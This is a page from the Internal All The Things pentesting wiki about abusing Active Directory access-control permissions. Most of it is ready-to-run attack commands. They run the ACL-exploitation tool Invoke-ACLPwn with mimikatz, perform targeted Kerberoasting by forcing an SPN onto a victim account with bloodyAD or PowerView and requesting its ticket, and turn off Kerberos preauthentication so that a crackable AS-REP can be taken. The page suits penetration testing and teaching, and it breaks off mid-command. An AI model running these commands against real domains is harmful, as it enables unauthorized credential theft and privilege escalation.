# Active Directory - Access Controls ACL/ACE - Internal All The Things
URL: https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-adds-acl-ace/

Active Directory - Access Controls ACL/ACE - Internal All The Things

# Active Directory - Access Controls ACL/ACE

An Access Control Entry (ACE) is a specific permission granted or denied to a user or group for a particular resource, such as a file or directory. Each ACE defines the type of access allowed (e.g., read, write, execute) or denied.

An Access Control List (ACL) is a collection of Access Control Entries (ACEs) associated with a resource.

- Check ACL for an User with ADACLScanner.

```
ADACLScan.ps1 -Base "DC=contoso;DC=com" -Filter "(&(AdminCount=1))" -Scope subtree -EffectiveRightsPrincipal User1 -Output HTML -Show

```

- Automate ACL exploit Invoke-ACLPwn:

```
./Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -Username 'user1' -Domain 'domain.local' -Password 'Welcome01!'

```

### User/Computer

We can set a SPN on a target account, request a Service Ticket (ST), then grab its hash and kerberoast it.

- Windows/Linux

```
# Check for interesting permissions on accounts:
bloodyAD --host 10.10.10.10 -d attack.lab -u john.doe -p 'Password123*' get writable --otype USER --right WRITE --detail | egrep -i 'distinguishedName|servicePrincipalName'

# Check if current user has already an SPN setted:
bloodyAD --host 10.10.10.10 -d attack.lab -u john.doe -p 'Password123*' get object <UserName> --attr serviceprincipalname

# Force set the SPN on the account: Targeted Kerberoasting
bloodyAD --host 10.10.10.10 -d attack.lab -u john.doe -p 'Password123*' set object <UserName> serviceprincipalname -v 'ops/whatever1'

# Grab the ticket
GetUsersSPNs.py -dc-ip 10.10.10.10 'attack.lab/john.doe:Password123*' -request-user <UserName>

# Remove the SPN
bloodyAD --host 10.10.10.10 -d attack.lab -u john.doe -p 'Password123*' set object <UserName> serviceprincipalname

```

- Windows only

```
# Check for interesting permissions on accounts:
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}

# Check if current user has already an SPN setted:
PowerView2 > Get-DomainUser -Identity <UserName> | select serviceprincipalname

# Force set the SPN on the account: Targeted Kerberoasting
PowerView2 > Set-DomainObject <UserName> -Set @{serviceprincipalname='ops/whatever1'}
PowerView3 > Set-DomainObject -Identity <UserName> -Set @{serviceprincipalname='any/thing'}

# Grab the ticket
PowerView2 > $User = Get-DomainUser username 
PowerView2 > $User | Get-DomainSPNTicket | fl
PowerView2 > $User | Select serviceprincipalname

# Remove the SPN
PowerView2 > Set-DomainObject -Identity username -Clear serviceprincipalname

```

We can change a victim's userAccountControl to not require Kerberos preauthentication, grab the user's crackable AS-REP, and then change the setting back.

- Windows/Linux:

```
# Modify the userAccountControl
$ bloodyAD --host [DC IP] -d [DOMAIN] -u [AttackerUser] -p [MyPassword] add uac [Target_User] -f DONT_REQ_PREAUTH

# Grab the ticket
$ GetNPUsers.py DOMAIN/target_user -format